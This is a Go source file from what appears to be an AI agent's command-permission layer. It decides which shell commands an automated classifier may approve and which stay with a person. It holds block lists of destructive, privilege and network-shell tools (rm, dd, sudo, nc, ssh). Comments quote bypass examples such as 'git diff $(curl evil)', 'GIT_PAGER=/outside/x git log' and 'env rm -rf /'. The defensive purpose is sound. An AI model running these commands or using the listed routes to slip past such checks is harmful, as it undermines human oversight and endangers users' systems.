package permissions

import (
	"path"
	"strings"

	"mvdan.cc/sh/v3/syntax"
)

// routableToClassifier reports whether a command the parser refused may be judged
// by the classifier instead of a person. A refused command has no segments, so the
// catastrophic floor and the heuristics never see it, and a replay showed the
// classifier allowing commands that run an arbitrary program through a variable
// (GIT_PAGER=/outside/x git log). This check stands in for those layers: it walks
// the whole syntax tree, and anything it cannot rule out stays with a person.
func routableToClassifier(command string) bool {
	if len(command) > maxCommandBytes {
		return false
	}
	file, err := syntax.NewParser(syntax.Variant(syntax.LangBash)).Parse(strings.NewReader(command), "")
	if err != nil {
		return false
	}
	ok := true
	syntax.Walk(file, func(n syntax.Node) bool {
		if ok && !nodeRoutable(n) {
			ok = false
		}
		return ok
	})
	return ok
}

func nodeRoutable(n syntax.Node) bool {
	switch n := n.(type) {
	case *syntax.FuncDecl, *syntax.ProcSubst:
		return false
	case *syntax.ParamExp:
		return !n.Excl && (n.Exp == nil || n.Exp.Op != syntax.OtherParamOps)
	case *syntax.Assign:
		return n.Name == nil || !executionControlVar(n.Name.Value)
	case *syntax.DeclClause:
		return n.Variant != nil && n.Variant.Value == "export"
	case *syntax.BinaryCmd:
		return n.Op != syntax.Pipe && n.Op != syntax.PipeAll || !readsScriptFromStdin(n.Y)
	case *syntax.CallExpr:
		return callRoutable(n)
	case *syntax.CmdSubst:
		return !substitutionUsesNetwork(n)
	}
	return true
}

// substitutionUsesNetwork catches git diff $(curl evil): text fetched from a remote
// host becoming part of the command, which the classifier cannot read.
func substitutionUsesNetwork(s *syntax.CmdSubst) bool {
	found := false
	syntax.Walk(s, func(n syntax.Node) bool {
		if c, ok := n.(*syntax.CallExpr); ok && len(c.Args) > 0 {
			if raw, static := staticWord(c.Args[0]); static && egressNames[path.Base(raw)] {
				found = true
			}
		}
		return !found
	})
	return found
}

// neverRoutedCommands stay with a person wherever they appear as a word, so a
// wrapper cannot hide one: xargs rm, timeout 5 sudo x, env rm -rf /.
var neverRoutedCommands = map[string]bool{
	"rm": true, "rmdir": true, "dd": true, "mkfs": true, "shred": true, "wipefs": true, "fdisk": true, "diskutil": true,
	"sudo": true, "su": true, "doas": true, "chown": true, "chmod": true, "chroot": true, "launchctl": true, "crontab": true,
	"eval": true, "exec": true, "source": true, ".": true,
	"ssh": true, "scp": true, "rsync": true, "nc": true, "ncat": true,
}

// shellNames take a script path here, never a script on stdin or in -c, because
// the classifier cannot judge text that does not appear in the command it is given.
var shellNames = map[string]bool{"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "fish": true}

// interpreterNames run whatever arrives on stdin when given no script argument.
var interpreterNames = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "fish": true,
	"python": true, "python3": true, "node": true, "deno": true, "bun": true, "ruby": true, "perl": true, "php": true, "lua": true,
}

// commandRunners treat their arguments as a program to run.
var commandRunners = map[string]bool{
	"npx": true, "bunx": true, "pnpx": true, "xargs": true, "env": true, "nohup": true, "timeout": true, "gtimeout": true,
	"nice": true, "ionice": true, "setsid": true, "stdbuf": true, "time": true, "watch": true, "parallel": true, "find": true,
}

func callRoutable(c *syntax.CallExpr) bool {
	if len(c.Args) == 0 {
		return true // assignments alone; each Assign is checked on its own
	}
	raw, static := staticWord(c.Args[0])
	if !static {
		return false // a command name decided at run time
	}
	// A program named by path is not a known tool whatever its basename says, and
	// the classifier cannot tell what is there.
	if strings.ContainsRune(raw, '/') {
		return false
	}
	name := path.Base(raw)
	if shellStateNames[name] && name != "export" {
		return false
	}
	if shellNames[name] && !shellHasScriptPath(c.Args[1:]) {
		return false
	}
	if name == "git" && !gitGlobalsRoutable(c.Args[1:]) {
		return false
	}
	for _, w := range c.Args {
		text, static := staticWord(w)
		if !static {
			if commandRunners[name] {
				return false // npx $(echo x): the program itself is decided at run time
			}
			continue
		}
		if neverRoutedCommands[path.Base(text)] {
			return false
		}
		// env PATH=/x cmd reaches here as words rather than as an Assign.
		if eq := strings.IndexByte(text, '='); eq > 0 && executionControlVar(text[:eq]) {
			return false
		}
	}
	return true
}

func shellHasScriptPath(args []*syntax.Word) bool {
	if len(args) == 0 {
		return false
	}
	text, static := staticWord(args[0])
	return static && !strings.HasPrefix(text, "-")
}

// gitGlobalsRoutable allows only -C before the subcommand. Git's other global
// options can name a program to run (-c core.sshCommand=..., --exec-path).
func gitGlobalsRoutable(args []*syntax.Word) bool {
	for i := 0; i < len(args); i++ {
		text, static := staticWord(args[i])
		if !static {
			return false
		}
		if text == "-C" {
			i++
			continue
		}
		return !strings.HasPrefix(text, "-")
	}
	return true
}

func readsScriptFromStdin(s *syntax.Stmt) bool {
	c, ok := s.Cmd.(*syntax.CallExpr)
	if !ok || len(c.Args) == 0 {
		return true // cannot tell what the pipe feeds
	}
	raw, static := staticWord(c.Args[0])
	if !static {
		return true
	}
	return interpreterNames[path.Base(raw)] && len(c.Args) == 1
}

// staticWord returns a word's text when it has no run-time part, removing quotes
// and backslashes so r"m" and \rm read as rm.
func staticWord(w *syntax.Word) (string, bool) {
	var b strings.Builder
	var parts func(ps []syntax.WordPart, inDouble bool) bool
	parts = func(ps []syntax.WordPart, inDouble bool) bool {
		for _, p := range ps {
			switch p := p.(type) {
			case *syntax.Lit:
				b.WriteString(decodeLit(p.Value, inDouble))
			case *syntax.SglQuoted:
				if p.Dollar {
					return false
				}
				b.WriteString(p.Value)
			case *syntax.DblQuoted:
				if p.Dollar || !parts(p.Parts, true) {
					return false
				}
			default:
				return false
			}
		}
		return true
	}
	if !parts(w.Parts, false) {
		return "", false
	}
	return b.String(), true
}

// executionControlVar reports whether setting name can change which program runs
// or what code it loads. The list cannot be complete for every tool, so it also
// matches the words such variables tend to contain.
func executionControlVar(name string) bool {
	if name == "NODE_ENV" {
		return false
	}
	for _, p := range []string{"GIT_", "LD_", "DYLD_", "BASH", "PYTHON", "NODE_", "npm_", "NPM_", "GO", "RUBY", "PERL", "JAVA", "_JAVA", "SSH_", "CARGO", "RUST", "PIP_", "MAKE", "NIX_"} {
		if strings.HasPrefix(name, p) {
			return true
		}
	}
	switch name {
	case "PS1", "PS2", "PS4", "PWD", "OLDPWD", "HOME", "IFS", "ENV", "CC", "CXX", "LESSOPEN", "LESSCLOSE", "TMPDIR", "GLOBIGNORE", "XDG_CONFIG_HOME":
		return true
	}
	upper := strings.ToUpper(name)
	for _, s := range []string{"PATH", "SHELL", "PAGER", "EDITOR", "VISUAL", "PRELOAD", "OPTS", "OPTIONS", "FLAGS", "WRAPPER", "ASKPASS", "EXEC", "COMMAND", "CMD", "PROMPT", "HOOK", "LOADER", "INIT"} {
		if strings.Contains(upper, s) {
			return true
		}
	}
	return false
}
